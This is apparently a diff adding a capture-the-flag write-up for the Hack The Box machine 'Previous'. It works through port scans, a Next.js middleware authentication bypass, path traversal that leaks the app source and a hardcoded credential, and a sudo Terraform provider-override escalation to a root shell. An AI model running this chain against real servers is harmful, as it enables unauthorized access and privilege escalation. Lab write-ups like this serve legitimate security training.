@@ -1,0 +1,156 @@
+
+# nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCA>
+|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
+
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://previous.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+________________________________________________________________________________________________________________________________________________________________________________________________________
+# Port 80 [ This servers a web server hosting on next js ]
+
+# nuclei [ Finds nothing much intersting ] 
+
+[external-service-interaction] [http] [info] http://previous.htb
+[waf-detect:nginxgeneric] [http] [info] http://previous.htb
+[snmpv3-detect] [javascript] [info] previous.htb:161 ["Enterprise: unknown"]
+[ssh-server-enumeration] [javascript] [info] previous.htb:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13"]
+[ssh-sha1-hmac-algo] [javascript] [info] previous.htb:22
+[ssh-password-auth] [javascript] [info] previous.htb:22
+[ssh-auth-methods] [javascript] [info] previo
+...<redacted>...
+mbedder-policy] [http] [info] http://previous.htb
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://previous.htb
+[http-missing-security-headers:strict-transport-security] [http] [info] http://previous.htb
+[nginx-version] [http] [info] http://previous.htb ["nginx/1.18.0"]
+[caa-fingerprint] [dns] [info] previous.htb
+________________________________________________________________________________________________________________________________________________________________________________________________________                                             
+
+# Nextjs Vulnerability [ Additional reaseach reveals that we have this host header vulnerability ]
+      x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+reference : https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/
+________________________________________________________________________________________________________________________________________________________________________________________________________
+# fuzzing 
+
+        # parameter fuzzing
+❯ dirsearch -u http://previous.htb/api -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'                   ⏎
+
+[ This finds us an endpoint that's intresting ]
+400    28B   http://previous.htb/api/download
+________________________________________________________________________________________________________________________________________________________________
+        # finding additional parameters
+❯ ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w /usr/share/fuzzDicts/paramDict/AllParam.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fw 2
+
+[ One example parameter was found to have a special echo ]
+________________________________________________________________________________________________________________________________________________________________
+# LFI 
+❯ curl 'http://previous.htb/api/download?example=../../../../etc/passwd' -H 'X-Middleware-Subrequest: mi>
+
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+...<redacted>...
+node:x:1000:1000::/home/node:/bin/sh
+nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
+                                                
+[ Two users, node and nextjs, were found. After looking at the environment variables, they found that the startup path was/app. ]
+
+                        [ Now you must research to see a directory example of nextjs to understand the next procedures ]
+________________________________________________________________________________________________________________________________________________________________________________________________________
+❯ curl 'http://previous.htb/api/download?example=../../../../app/.next/routes-manifest.json' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -s | jq
+{
+  "version": 3,
+  "pages404": true,
+  "caseSensitive": false,
+  "basePath": "",
+  "redirects": [
+   ...<redacted>...
+  "dynamicRoutes": [
+    {
+      "page": "/api/auth/[...nextauth]",
+      "regex": "^/api/auth/(.+?)(?:/)?$",
+      "routeKeys": {
+        "nxtPnextauth": "nxtPnextauth"
+      },
+      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
+    },
+  ...<redacted>...
+    "queryHeader": "x-nextjs-rewritten-query"
+  },
+  "rewrites": []
+}                  
+
+[ you can directly see the relevant information about the routing configuration ]
+________________________________________________________________________________________________________________________________________________________________________________________________________
+❯ curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
+
+[ There’s the authentication logic section that we focused on, /api/auth/[...nextauth] ]
+
+"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();                                                                                                                                                                                                                    
+[ The above text contains the username and passwd we extract ]
+
+        *** Congratulations ! now you can ssh ***
+________________________________________________________________________________________________________________________________________________________________________________________________________
+
+Privilege Escalation...
+________________________________________
+# checking sudo permissioins
+jeremy@previous:~/privesc$ sudo -l
+Matching Defaults entries for jeremy on previous:
+    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply
+[ Terraform is a Infrastructure as Code (IaC, Infrastructure as Code) tool , used to define, deploy, and manage cloud resources or on-premises infrastructure.]
+________________________________________________________________________________________________________________________________________________________________
+## To get root you must do these
+
+[Create a file called  in your working directory with this content]
+jeremy@previous:~/privesc$ nano main.go
+________________________________________________________________________________
+[Place the binary in your override path / Move it into the directory Terraform expects and give permissions ]
+
+jeremy@previous:~/privesc$ chmod +x /home/jeremy/privesc/terraform-provider-examples_vtest
+________________________________________________________________________________________________________________________
+[ Make sure your  file contains the override ]
+
+jeremy@previous:~$ cat /home/jeremy/privesc/dev.tfrc 
+provider_installation {
+  dev_overrides {
+    "previous.htb/examples" = "/home/jeremy/privesc"
+  }
+  direct {}
+}
+________________________________________________________________________________________________________________________________________________________________
+
+[ Execute with Terraform ]
+jeremy@previous:~/privesc$ export TF_CLI_CONFIG_FILE=/home/jeremy/privesc/dev.tfrc
+________________________________________________________________________________________________________________________
+[Trigger Terraform as root]
+
+jeremy@previous:~/privesc$ sudo /usr/bin/terraform -chdir=/opt/examples apply
+╷
+│ Warning: Provider development overrides are in effect
+│ 
+...<redacted>...
+│ Additional notes about plugin:
+│   Path: /home/jeremy/privesc/terraform-provider-examples_vtest
+│   Mode: -rwxr-xr-x
+│   Owner: 1000 [jeremy] (current: 0 [root])
+│   Group: 1000 [jeremy] (current: 0 [root])
+│ ..
+╵
+________________________________________________________________________________________________________________________________________________________________
+# root
+
+jeremy@previous:~/privesc$ /tmp/rootbash -p
+rootbash-5.1# cat /root/root.txt
+ba-bye!
